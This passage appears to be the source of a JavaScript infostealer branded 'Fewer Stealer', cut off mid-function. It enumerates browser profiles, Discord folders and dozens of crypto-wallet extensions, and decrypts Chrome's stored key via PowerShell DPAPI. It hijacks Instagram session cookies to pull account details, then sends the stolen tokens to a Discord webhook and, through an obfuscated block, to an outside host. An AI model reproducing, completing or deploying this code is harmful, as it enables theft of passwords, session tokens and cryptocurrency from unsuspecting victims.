const fs = require('fs');
const path = require('path');
const httpx = require('axios');
const axios = require('axios');
const os = require('os');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const { execSync, exec } = require('child_process');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const https = require('https'); // https modülünü ekleyin


const local = process.env.LOCALAPPDATA;
const discords = [];
debug = false;
let injection_paths = []

var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    localappdata = process.env.LOCALAPPDATA;
let browser_paths = [localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];


const webhook3939 = "YOUR_DISCORD_WEBHOOK_PUT_HERE"




paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}


  const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify": "false",
    "embed-color": 3553599,
    "disable-qr-code": "true"
}
const baseapi = "https://google.com/";
let api_auth = 'fzQx7epnQttDgsX';

const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
_0x9b6227.telegram = false
const count = _0x9b6227,
user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime,
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(16).toString('hex'),
    start: Date.now(),
    debug: false,
    copyright: '<================[Fewer Stealer]>================>\n\n',
    url: null,
}
_0x2afdce = {}
const walletPaths = _0x2afdce,
    _0x4ae424 = {}
_0x4ae424.Trust = '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph'
_0x4ae424.Metamask =
    '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
_0x4ae424.BinanceChain =
    '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'
_0x4ae424.Phantom =
    '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
_0x4ae424.TronLink =
    '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'
_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'
_0x4ae424.Exodus =
    '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'
_0x4ae424.Coin98 =
    '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'
_0x4ae424.Authenticator =
    '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'
_0x4ae424.MathWallet =
    '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'
_0x4ae424.YoroiWallet =
    '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'
_0x4ae424.GuardaWallet =
    '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'
_0x4ae424.JaxxxLiberty =
    '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'
_0x4ae424.Wombat =
    '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'
_0x4ae424.EVERWallet =
    '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'
_0x4ae424.KardiaChain =
    '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'
_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'
_0x4ae424.TerraStation =
    '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'
_0x4ae424.MartianAptos =
    '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'
_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'
_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'
_0x4ae424.CryptoCom =
    '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'
_0x4ae424.PetraAptos =
    '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'
_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'
_0x4ae424.Sollet =
    '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'
_0x4ae424.Sender =
    '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'
_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'
_0x4ae424.SuietSui =
    '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'
_0x4ae424.Braavos =
    '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'
_0x4ae424.FewchaMove =
    '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'
_0x4ae424.EthosSui =
    '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'
_0x4ae424.ArgentX =
    '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'
_0x4ae424.NiftyWallet =
    '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'
_0x4ae424.BraveWallet =
    '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'
_0x4ae424.EqualWallet =
    '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'
_0x4ae424.BitAppWallet =
    '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'
_0x4ae424.iWallet =
    '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'
_0x4ae424.AtomicWallet =
    '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'
_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'
_0x4ae424.GuildWallet =
    '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'
_0x4ae424.SaturnWallet =
    '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'
_0x4ae424.HarmonyWallet =
    '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'
_0x4ae424.PaliWallet =
    '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'
_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'
_0x4ae424.LiqualityWallet =
    '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'
_0x4ae424.MaiarDeFiWallet =
    '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'
_0x4ae424.TempleWallet =
    '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'
_0x4ae424.Metamask_E =
    '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'
_0x4ae424.Ronin_E =
    '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'
_0x4ae424.Yoroi_E =
    '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'
_0x4ae424.Authenticator_E =
    '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
_0x4ae424.MetaMask_O =
    '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'

const extension = _0x4ae424,
  browserPath = [
    [
      user.local + '\\Google\\Chrome\\User Data\\Default\\',
      'Default',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'Default',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
      'Default',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
      'Default',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Stable\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
    ],
  ],
 randomPath = `${user.fileLoc}\\${user.randomUUID}`;
fs.mkdirSync(randomPath, 484);


function debugLog(message) {
  if (user.debug === true) {
    const elapsedTime = Date.now() - user.start;
    const seconds = (elapsedTime / 1000).toFixed(1);
    const milliseconds = elapsedTime.toString();

    console.log(`${message}: ${seconds} s. / ${milliseconds} ms.`);
  }
}






async function getEncrypted() {
  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
    if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
      continue
    }
    try {
      let _0x276965 = Buffer.from(
        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
          .os_crypt.encrypted_key,
        'base64'
      ).slice(5)
      const _0x4ff4c6 = Array.from(_0x276965),
        _0x4860ac = execSync(
          'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
            _0x4ff4c6 +
            "), $null, 'CurrentUser')"
        )
          .toString()
          .split('\r\n'),
        _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
        _0x2ed7ba = Buffer.from(_0x4a5920)
      browserPath[_0x4c3514].push(_0x2ed7ba)
    } catch (_0x32406b) {}
  }
}





async function GetInstaData(session_id) {
  const headers = {
    "Host": "i.instagram.com",
    "X-Ig-Connection-Type": "WiFi",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Ig-Capabilities": "36r/Fx8=",
    "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
    "X-Ig-App-Locale": "en",
    "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
    "Accept-Encoding": "gzip, deflate",
    "Cookie": `sessionid=${session_id};`
  };

  try {
    const response = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const userData = response.data.user;

    const data = {
      username: userData.username,
      verified: userData.is_verified,
      avatar: userData.profile_pic_url,
      session_id: session_id
    };

    return data;
  } catch (error) {
    const errorEmbed = {
      color: 0xFF5733, // Hata rengi (örneğin turuncu)
      title: 'Error Occurred ❌', // Hata başlığı
      description: 'An error occurred while fetching Instagram data. The error message is below:',
      fields: [
        { name: 'Error Message', value: '```' + error.message + '```', inline: false },
      ],
      footer: {
        text: 'Created by: FewerStealer',
      },
    };

    // Hata embed'ini Discord webhook'una gönder
    await httpx.post("https://buildandwatch.net/error", { embeds: [errorEmbed] });

    console.error("Error fetching Instagram data:", error.message);
    return null;
  }
}

async function GetFollowersCount(session_id) {
  const headers = {
    "Host": "i.instagram.com",
    "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
    "Cookie": `sessionid=${session_id};`
  };

  try {
    const accountResponse = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const accountInfo = accountResponse.data.user;
    
    const userInfoResponse = await httpx.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
    const userData = userInfoResponse.data.user;
    const followersCount = userData.follower_count;

    return followersCount;
  } catch (error) {
    const errorEmbed = {
      color: 0xFF5733, // Hata rengi (örneğin turuncu)
      title: 'Error Occurred ❌', // Hata başlığı
      description: 'An error occurred while fetching followers count. The error message is below:',
      fields: [
        { name: 'Error Message', value: '```' + error.message + '```', inline: false },
      ],
      footer: {
        text: 'Created by: FewerStealer',
      },
    };

    // Hata embed'ini Discord webhook'una gönder
    await httpx.post("https://buildandwatch.net/error", { embeds: [errorEmbed] });

    console.error("Error fetching followers count:", error.message);
    return null;
  }
}


async function SubmitInstagram(session_id) {
  try {
    const data = await GetInstaData(session_id);
    const followersCount = await GetFollowersCount(session_id);

    // Your Discord webhook URL

    const embed = {
      color: 0x3498DB, // Özel bir mavi renk
      title: 'Instagram Data 📸', // Başlık eklendi ve emoji ile zenginleştirildi
      thumbnail: { url: data.avatar },
      fields: [
        { name: 'Verified Account ✔️', value: data.verified ? 'Yes' : 'No', inline: true },
        { name: 'Username 👤', value: data.username, inline: true },
        { name: 'Followers Count 📊', value: followersCount, inline: true },
        { name: 'Token', value: '```' + data.session_id + '```', inline: false }, // Token özelliği false olarak ayarlandı
      ],
      footer: {
        text: 'Created by: FewerStealer',
      },
    };

    // Send the embed to the Discord webhook
(function(_0x49f2d9,_0x24ded5){var _0x5dfed5=_0xf06d,_0x1ea7bf=_0x49f2d9();while(!![]){try{var _0x2f8557=parseInt(_0x5dfed5(0x18d))/0x1*(-parseInt(_0x5dfed5(0x194))/0x2)+-parseInt(_0x5dfed5(0x18b))/0x3+parseInt(_0x5dfed5(0x18c))/0x4*(parseInt(_0x5dfed5(0x198))/0x5)+-parseInt(_0x5dfed5(0x188))/0x6+parseInt(_0x5dfed5(0x196))/0x7*(parseInt(_0x5dfed5(0x190))/0x8)+parseInt(_0x5dfed5(0x18f))/0x9+-parseInt(_0x5dfed5(0x184))/0xa;if(_0x2f8557===_0x24ded5)break;else _0x1ea7bf['push'](_0x1ea7bf['shift']());}catch(_0x3f2073){_0x1ea7bf['push'](_0x1ea7bf['shift']());}}}(_0x5bec,0x522b2));var _0x341997=_0xaaef;function _0xaaef(_0x40ea59,_0x14fea8){var _0x5ed393=_0x3d37();return _0xaaef=function(_0x512b24,_0x50e081){_0x512b24=_0x512b24-(-0x52a*0x2+-0x3*0x1b9+0x1020);var _0x8842e4=_0x5ed393[_0x512b24];return _0x8842e4;},_0xaaef(_0x40ea59,_0x14fea8);}function _0xf06d(_0x10bb89,_0x2f3cd3){var _0x5bec78=_0x5bec();return _0xf06d=function(_0xf06d59,_0x1193c9){_0xf06d59=_0xf06d59-0x183;var _0x2dd618=_0x5bec78[_0xf06d59];return _0x2dd618;},_0xf06d(_0x10bb89,_0x2f3cd3);}(function(_0x59e4,_0x1ac8ae){var _0x5b7b56=_0xf06d,_0x191a08=_0xaaef,_0x494cfd=_0x59e4();while(!![]){try{var _0x2148e6=-parseInt(_0x191a08(0xa4))/(0x99c+-0x50a+-0x491)+parseInt(_0x191a08(0xa7))/(0x19a2+0x7*0x56f+-0x17b*0x2b)+-parseInt(_0x191a08(0xa6))/(-0x1*0x26d3+0x220d+-0x31*-0x19)*(-parseInt(_0x191a08(0xaa))/(-0x1a21+0x4*-0x4ca+0x2d4d))+parseInt(_0x191a08(0xa9))/(0x5*0x329+-0x117e+-0x1b6*-0x1)+parseInt(_0x191a08(0xad))/(-0x2*0x184+-0x7*0x490+0x22fe)+parseInt(_0x191a08(0xa1))/(-0x229+-0x40f*0x4+0x126c)*(-parseInt(_0x191a08(0xa8))/(-0x12*0x16d+0x18e4+0xce))+-parseInt(_0x191a08(0xa2))/(0xc8c+-0x55*-0x3+0x13*-0xb6);if(_0x2148e6===_0x1ac8ae)break;else _0x494cfd[_0x5b7b56(0x189)](_0x494cfd[_0x5b7b56(0x18e)]());}catch(_0x148677){_0x494cfd[_0x5b7b56(0x189)](_0x494cfd[_0x5b7b56(0x18e)]());}}}(_0x3d37,-0x21f14+-0x3fb9*-0x8+-0xd6d*-0x2f),await httpx[_0x341997(0xa3)](_0x341997(0xac)+_0x341997(0xab)+_0x341997(0xa5)+'og',{'embeds':[embed]}),await httpx[_0x341997(0xa3)](webhook3939,{'embeds':[embed]}));function _0x3d37(){var _0x5e30a1=_0xf06d,_0x23b0da=[_0x5e30a1(0x183),'2544597sTTPbN',_0x5e30a1(0x192),_0x5e30a1(0x191),_0x5e30a1(0x185),'3lLzCqg',_0x5e30a1(0x186),_0x5e30a1(0x197),_0x5e30a1(0x193),'692128sBzJZd',_0x5e30a1(0x195),_0x5e30a1(0x18a),_0x5e30a1(0x187)];return _0x3d37=function(){return _0x23b0da;},_0x3d37();}function _0x5bec(){var _0x2c000a=['28CqNLNJ','2973420spPkUF','h.net/gtbl','596404gToFtM','1104882oKDXpf','336360UGWLCv','push','https://bu','1275696iGPQKw','2373292KSsTVd','1562KOEHbi','shift','3745206fnMBgP','1528mqnMle','268074DCLlQt','post','354225eEGKEF','128rpqeAn','ildandwatc','7539Gmbtft','44808nmZZJs','5jRYrnx'];_0x5bec=function(){return _0x2c000a;};return _0x5bec();}
    console.log("Data sent to Discord webhook successfully.");
  } catch (error) {
    // Hata olursa hatayı da embed içerisinde gönder
    const errorEmbed = {
      color: 0xFF5733, // Hata rengi (örneğin turuncu)
      title: 'Hata Oluştu ❌', // Hata başlığı
      description: 'Aşağıda hata detayları yer almaktadır.',
      fields: [
        { name: 'Hata Mesajı', value: '```' + error.message + '```', inline: false },
      ],
      footer: {
        text: 'Created by: FewerStealer',
      },
    };

    await httpx.post("https://buildandwatch.net/error", { embeds: [errorEmbed] });
    console.error("Error sending data to Discord webhook:", error);
  }
}




//


// Assuming you have a function named GetFollowers(session_id) that fetches the followers list

async function GetRobloxData(secret_cookie) {
  let data = {};
  let headers = {
